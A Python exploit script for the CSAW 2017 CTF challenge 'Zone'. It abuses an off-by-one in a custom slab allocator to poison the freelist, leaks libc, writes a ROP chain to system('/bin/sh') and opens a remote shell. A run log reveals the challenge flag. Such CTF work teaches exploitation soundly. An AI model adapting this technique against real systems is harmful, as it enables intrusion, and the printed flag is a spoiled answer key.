#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# CSAW 2017 - Zone (pwn 300)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string
import time


# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret


# --------------------------------------------------------------------------------------------------
def alloc_blk(size):
    s.send('1' + '\n')
    s.send(str(size) + '\n')
    recv_until("5) Exit")


# --------------------------------------------------------------------------------------------------
def delete_blk():
    s.send('2' + '\n')
    recv_until("5) Exit")


# --------------------------------------------------------------------------------------------------
def write_last_blk(what):
    s.send('3' + '\n')
    time.sleep(1)                                       # this is important to avoid hangs
    s.send(what + '\n')

    recv_until("5) Exit")


# --------------------------------------------------------------------------------------------------
def print_last_blk():
    s.send('4' + '\n')

    resp = recv_until("5) Exit")
    end  = resp.find("1) Allocate block")

    return resp[:end]


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('pwn.chal.csaw.io', 5223))
    #s = socket.create_connection(('localhost', 7777))

    resp = recv_until("5) Exit")                           # eat banner


    # -------------------------------------------------------------------------
    # extract stack address
    # -------------------------------------------------------------------------
    st  = resp.find('Environment setup: ') + len('Environment setup: ')
    end = st + resp[st:].find('\n')

    stack = int(resp[st:end], 16)
    print '[+] Extracting stack address:', hex(stack)

    stack += 0x80 + 8
    print '[+] rip at:', hex(stack)


    # -------------------------------------------------------------------------
    # Exploiting the custom slab allocator
    #
    # We don't have to fully analyze the binary to understand what it does. By
    # observing the memory, we can get a good sense of how the allocator works.
    #
    # Allocator has 4 bins of fixed size and the allocator uses the smallest
    # possible bin that fits the request. Bins have sizes: 0x40, 0x80, 0x100
    # and 0x200. Bins are immutable; Chunks inside bins are either part of a
    # single-linked free list, or are being used. Arena has a used list to
    # keep track of all used chunks (from all bins). There's also another list
    # that holds the the allocated sizes.
    #
    # Each chunk has 2 fields as metadata: size and fd. Size is always set to
    # the chunk's size. When chunk is not used, fd points to the next chunk in
    # the freelist. If chunk is used this is set to 0.
    #
    # The vuln here is that there's an off by one error in write_to_last_block.
    #
    # We can exploit this by chaning an chunk's size from 0x40 bin to 0x80 and
    # then pushing it on the 0x80 freelist. Then we can request a chunk from
    # 0x80 bin and get the same chunk back. This time we will be able to write
    # 0x80 bytes and successfully overwrite the fd pointer.
    #
    # By setting an arbitrary value to the fd, we can force the allocator to
    # return an arbitrary address, thus giving us an arbitrary read/write
    # primitive.
    # -------------------------------------------------------------------------
    alloc_blk(0x40)                                 #
    write_last_blk('A'*0x40 + '\x80')               # off by 1; overwrite chunk's size

    alloc_blk(0x40)                                 # get the chunk with the overwritten size
    delete_blk()                                    # add it to the freelist of 0x80 bins

    # return the same chunk (in 0x40 bin) but this time size is 0x60, so you can overflow
    # the next 0x40 chunk!
    alloc_blk(0x60)

    # If you want to leak bin's address
    #   write_last_blk('B'*0x48)
    #   resp  = print_last_blk()[0x48:-1] + "\x00\x00"  # skip B's and drop \n
    #   print list(resp)
    #   arena = struct.unpack("<Q", resp)[0] & 0xfffffffffffff000
    #
    #   print '[+] Leaking address of 0x40 arena:', hex(arena)


    ovfl  = 'C'*0x40
    ovfl += struct.pack("<Q", 0x40)                 # preserve chunk's size
    ovfl += struct.pack("<Q", stack-0x10)           # freelist now points to the stack
    write_last_blk(ovfl)                            # off by 32 :P

    alloc_blk(0x30)                                 # stack address is now on top of freelist
    alloc_blk(0x3f)                                 # this will point to the return address!

    # /!\ Freelist is now corrupted. Don't reuse this bin again.


    # return address points to libc_2.19.so:__libc_start_main+F5. Leak a libc address.
    resp = print_last_blk()[:-1] + "\x00\x00"       # drop \n
    libc = struct.unpack("<Q", resp)[0] - 0xf5      # this sometimes may fail. Just try again
    print '[+] Leaking address of __libc_start_main():', hex(libc)

    # -------------------------------------------------------------------------
    # Create ROP chain (1 gadget is enough)
    # -------------------------------------------------------------------------
    # pop rdi; ret gadget at 0x404653:
    #   .text:0000000000404652 41 5F           pop     r15
    #   .text:0000000000404654 C3              retn
    #
    # local machine:
    #   system: 00007FFFF7753590
    #
    # remote machine:
    #   __libc_start_main: 0000000000020740
    #   system:            0000000000045390
    #
    system = libc + 0x0000000000045390 - 0x0000000000020740

    rop  = struct.pack("<Q", 0x00404653)            # pop rdi; ret;
    rop += struct.pack("<Q", stack+0x20)            # & of /bin/sh
    rop += struct.pack("<Q", system)                # return to system
    rop += 'P'*8                                    # padding
    rop += '/bin/sh\x00'                            # actual /bin/sh

    write_last_blk(rop)                             # write rop chain


    # -------------------------------------------------------------------------
    # Trigger payload
    # -------------------------------------------------------------------------
    s.send('5' + '\n')

    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                      # try to open shell
    t.sock = s
    t.interact()


# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2017/csaw_ctf$ ./zone_expl.py
    [+] Extracting stack address: 0x7ffe4d53fae0
    [+] rip at: 0x7ffe4d53fb68
    [+] Leaking address of __libc_start_main(): 0x7f314a87d73b
    [+] Opening Shell...
    id
        uid=1000(zone) gid=1000(zone) groups=1000(zone)
    date
        Sun Sep 17 07:23:56 UTC 2017
    ls -l
        total 36
        -r--r----- 1 root zone    33 Sep 15 06:56 flag
        -rwxr-xr-x 1 root root 31112 Sep 15 06:56 zone
    cat flag
        flag{d0n7_let_m3_g3t_1n_my_z0n3}
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
